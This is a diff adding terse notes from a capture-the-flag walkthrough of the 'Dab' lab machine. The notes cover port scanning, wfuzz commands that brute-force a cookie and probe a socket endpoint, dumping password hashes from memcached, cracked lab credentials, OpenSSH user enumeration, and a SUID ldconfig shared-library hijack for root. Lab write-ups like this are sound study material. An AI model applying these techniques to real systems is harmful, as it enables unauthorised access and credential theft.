@@ -1,0 +1,132 @@
+Hints:
+- fuzz,fuzz,fuzz!
+- read the source code => use cache
+- bypass bad characters filtering
+- how to make the memcache to cache the user table?
+- many ways to do this, one of them works
+
+Details:
+- /usr/share/seclists/Fuzzing/alphanum-case-extra.txt => use it to test bad chars
+- burp -> decoder -> smart decoder the users
+- ldconfig has SUID!
+
+Logs:
+# init contact
+21/tcp   open  ftp     vsftpd 3.0.3
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    nginx 1.10.3 (Ubuntu)
+8080/tcp open  http    nginx 1.10.3 (Ubuntu)
+
+gobuster on 80:
+/login
+/logout
+
+gobuster on 8080:
+/ => Access denied: password authentication cookie not set
+/socket => "missing parameters"
+
+# ftp
+get the dab.jpg
+steghide extract -sf dab.jpg => dab.txt => 'Nope...' => useless
+
+# http 80
+sqlmap => nothing
+login with admin, output doesn't have '.' at the end. So it must be the right user.
+brute-force by hydra => password is Password1 => source code shows that it uses cache.
+
+# http 8080
+fuzz the cookie
+wfuzz -c -u "http://dab.htb:8080" -b FUZZ=1 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh=322
+=> cookie name is password, but value is wrong
+wfuzz -c -u "http://dab.htb:8080" -b password=FUZZ -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh=322
+=> value is secret
+
+/ => tcp socket test, write 80 and 'xx' => jump to /socket?port=80&cmd=xx => output http 400
+enter closed port will internal error
+enter ;ls => Suspected hacking attempt detected
+feels like that it is using nc
+
+wfuzz -c -u "http://dab.htb:8080/socket?port=80&&cmd=FUZZ" -b password=secret -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt --hw 84
+=> get bad chars
+000001:  C=200     14 L       27 W          303 Ch        "!"
+000002:  C=200     14 L       27 W          303 Ch        """
+000003:  C=200     14 L       25 W          287 Ch        "#"
+000006:  C=200     14 L       25 W          287 Ch        "&"
+000008:  C=200     14 L       27 W          303 Ch        "("
+000004:  C=200     14 L       27 W          303 Ch        "$"
+000005:  C=200     14 L       27 W          303 Ch        "%"
+000007:  C=200     14 L       27 W          303 Ch        "'"
+000009:  C=200     14 L       27 W          303 Ch        ")"
+000010:  C=200     14 L       27 W          303 Ch        "*"
+000015:  C=200     14 L       27 W          303 Ch        "/"
+000012:  C=200     14 L       27 W          303 Ch        ","
+000014:  C=200     14 L       27 W          303 Ch        "."
+000013:  C=200     14 L       27 W          303 Ch        "-"
+000026:  C=200     14 L       27 W          303 Ch        ":"
+000027:  C=200     14 L       27 W          303 Ch        ";"
+000029:  C=200     14 L       27 W          303 Ch        "="
+000031:  C=200     14 L       27 W          303 Ch        "?"
+000032:  C=200     14 L       27 W          303 Ch        "@"
+000028:  C=200     14 L       27 W          303 Ch        "<"
+000030:  C=200     14 L       27 W          303 Ch        ">"
+000059:  C=200     14 L       27 W          303 Ch        "["
+000060:  C=200     14 L       27 W          303 Ch        "\"
+000061:  C=200     14 L       27 W          303 Ch        "]"
+000062:  C=200     14 L       27 W          303 Ch        "^"
+000063:  C=200     14 L       27 W          303 Ch        "_"
+000064:  C=200     14 L       27 W          303 Ch        "`"
+000091:  C=200     14 L       27 W          303 Ch        "{"
+000092:  C=200     14 L       27 W          303 Ch        "|"
+000093:  C=200     14 L       27 W          303 Ch        "}"
+000094:  C=200     14 L       27 W          303 Ch        "~"
+000095:  C=200     14 L       25 W          287 Ch        ""
+
+brute-force the ports
+wfuzz -c -u "http://dab.htb:8080/socket?port=FUZZ&&cmd=xx" -b password=secret -z range,1-65535 --hc 500
+=>
+21,22,80,8080,11211
+what is in 11211? google => it is memcached
+google how to use it
+stat =>  version 1.4.25 => no exploit found yet
+https://stackoverflow.com/questions/19560150/get-all-keys-set-in-memcached => but nothing insteresting in item 16:w
+login user again and read slab 26, then get users with md5 hashed passwords
+john only cracked small part of them =>
+piggy            (abbigail)
+monkeyman        (ona)
+strength         (irma)
+blaster          (alec)
+megadeth         (wendell)
+misfits          (aglae)
+lovesucks1       (rick)
+Princess1        (genevieve)
+default          (default)
+hacktheplanet    (d_murphy)
+demo             (demo)
+
+tried with ssh and ftp brute force, no dice. So the user must be in the one that we haven't cracked.
+
+(!) OpenSSH has a vuln to enum user. => genevieve is a valid user!
+decrypt its hash online => Princess1
+
+ssh in
+
+# priv esc
+find on SUID file /usr/bin/myexec
+also sudo -l => we can sudo /usr/bin/try_harder
+
+ldd => aslr is on
+
+copy the libseclogin.so
+debug myexec find this "s3cur3l0g1n"
+try it, myexec says:
+seclogin() called
+TODO: Placeholder for now, function not implemented yet
+
+try to change LD_LIBRARY_PATH and use our seclogin()
+
+find:
+https://www.boiteaklou.fr/Abusing-Shared-Libraries.html#3-setuid-bit-on-ldconfig
+https://www.cprogramming.com/tutorial/shared-libraries-linux-gcc.html#fn:pic
+https://github.com/jivoi/pentest/blob/master/shell/rootshell.c
+
+and add stdlib.h
